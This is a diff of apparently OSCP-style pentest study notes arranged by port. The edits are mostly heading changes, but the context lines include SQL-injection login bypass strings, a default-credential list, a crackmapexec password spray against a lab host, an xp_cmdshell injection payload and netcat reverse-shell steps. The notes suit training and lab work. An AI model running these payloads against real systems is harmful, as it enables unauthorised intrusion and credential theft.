@@ -1,4 +1,5 @@
-## Links
+## Ports
+### Links
 
 - [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
 - [HackTricks 80](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web)
@@ -7,13 +8,13 @@
 - [FTP Enum](https://steflan-security.com/ftp-enumeration-guide/)
 - [HackTricks 53](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)
 - [HackTricks 22](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)
-- [NetCat Email][https://www.linuxjournal.com/content/sending-email-netcat]
+- [NetCat Email](https://www.linuxjournal.com/content/sending-email-netcat)
 - [Netcat SMTP](https://infosecwriteups.com/what-do-netcat-smtp-and-self-xss-have-in-common-stored-xss-a05648b72002)
 - [MSSQL HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
-- 
-## <ins>80/443 - HTTP</ins>
+- [Evil WinRM Guide](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)
+### <ins>80/443 - HTTP</ins>
 
-### First Thing
+#### First Thing
 
 ```
 
@@ -31,7 +32,7 @@
 
 ```
 
-### While Scans run:
+#### While Scans run:
 
 ```
 1. Try Weak Credentials, Default Login, Intercept Request in Burp, and Try Dictionary attack to crack the credentials, Try SQLi 
@@ -50,7 +51,7 @@
 
 ```
 
-### Default Creds Login Page
+#### Default Creds Login Page
 | User | Pass |
 | ---- | ---- |
 | admin | admin |
@@ -61,7 +62,7 @@
 | test | test |
 | guest | guest |
 | anonymous | anonymous |
-### SQL Injection
+#### SQL Injection
 | User | Pass |
 | ---- | ---- |
 | tom | tom |
@@ -73,9 +74,9 @@
 | 1' or 1=1 -- - | blah |
 | whatever' or '1'='1 | whatever' or '1'='1 |
 
-## <ins>139/445 - SMB</ins>
+### <ins>139/445 - SMB</ins>
 
-### Try
+#### Try
 ```
 1. Find SMB Version: 
 	1. tcpdump -i tun0 port <Victim Port> and src <Victim IP> -s0 -A -n 2>/dev/null 
@@ -104,7 +105,7 @@
 12. Try Crackmapexec, psexec, smbexec, wmiexec
 ```
 
-### If we have Username and Password
+#### If we have Username and Password
 ```
 1. Authenticated SMB Shares: smbclient \\\new-site -U <domain_name\username>
 
@@ -124,7 +125,7 @@
 9. crackmapexec smb 192.168.214.249 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/seclists/Passwords/darkweb2017-top100.txt -d relia.com --continue-on-success 
 ```
 
-## <ins>21 - FTP</ins>
+### <ins>21 - FTP</ins>
 
 ```
 1. Try FTP Default creds - anonymous:anonymous / admin:admin
@@ -154,7 +155,7 @@
 13. Look for hidden files, go back to a directory if you find anything, and look for creds in DB Files.
 ```
 
-## <ins>53 - DNS</ins>
+### <ins>53 - DNS</ins>
 
 ```
 1. nslookup: nslookup --- SERVER <IP> --- 127.0.0.1
@@ -173,7 +174,7 @@
 
 ```
 
-## <ins>22 - SSH</ins>
+### <ins>22 - SSH</ins>
 
 ```
 
@@ -194,7 +195,7 @@
 8. After initial access, find ssh keys in linux: find / -name ssh 2>/dev/null
 ```
 
-## <ins>389/636/3268 - LDAP</ins>
+### <ins>389/636/3268 - LDAP</ins>
 
 ```
 1. Domain name: nmap -n -sV --script "ldap* and not brute" <IP>
@@ -219,7 +220,7 @@ LDAP Login: ldapdomaindump <IP> [-r <IP>] -u '<domain\user>' -p '<pass>' [--auth
 
 ```
 
-## <ins>161 - SNMP</ins>
+### <ins>161 - SNMP</ins>
 
 ```
 
@@ -237,7 +238,7 @@ LDAP Login: ldapdomaindump <IP> [-r <IP>] -u '<domain\user>' -p '<pass>' [--auth
 
 ```
 
-## <ins>25 - SMTP</ins>
+### <ins>25 - SMTP</ins>
 
 ```
 1. To find Users: nmap --script smtp-enum-users.nse -p 25,465,587 <IP>
@@ -279,7 +280,7 @@ Make sure nc is setup and run this:
 
 ```
 
-## <ins>3389 - RDP</ins>
+### <ins>3389 - RDP</ins>
 
 ```
 If you get RDP, first transfer nc.exe (windows) or netcat (Linux) to get the shell back on our attacking machine.
@@ -305,7 +306,7 @@ If you get RDP, first transfer nc.exe (windows) or netcat (Linux) to get the she
 
 ```
 
-## <ins>135/593 - RPC</ins>
+### <ins>135/593 - RPC</ins>
 
 ```
 
@@ -320,7 +321,7 @@ rpcclient -U "" -N <IP>
 
 ```
 
-## <ins>5985/5986 - Evil-winrm</ins>
+### <ins>5985/5986 - Evil-winrm</ins>
 
 ```
 1. Check: crackmapexec --verbose winrm <IP> -u <username> -p <password>
@@ -336,7 +337,7 @@ rpcclient -U "" -N <IP>
 
 ```
 
-## <ins>3306 - MYSQL</ins>
+### <ins>3306 - MYSQL</ins>
 
 ```
 1. MYSQL Login: mysql -h <IP> -u <username> -p <pass> -P <port>
@@ -347,7 +348,7 @@ rpcclient -U "" -N <IP>
 
 ```
 
-### xp_cmdshell -> RCE
+#### xp_cmdshell -> RCE
 
 ```
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
@@ -402,7 +403,7 @@ admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 
 ```
 
-## <ins>1433 - MSSQL</ins>
+### <ins>1433 - MSSQL</ins>
 
 ```
 
@@ -416,7 +417,7 @@ admin'EXEC+xp_cmdshell+'c%3a\\inetpub\\wwwroot\\test.exe%3b--
 
 ```
 
-### xp_cmdshell -> RCE
+#### xp_cmdshell -> RCE
 
 ```
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
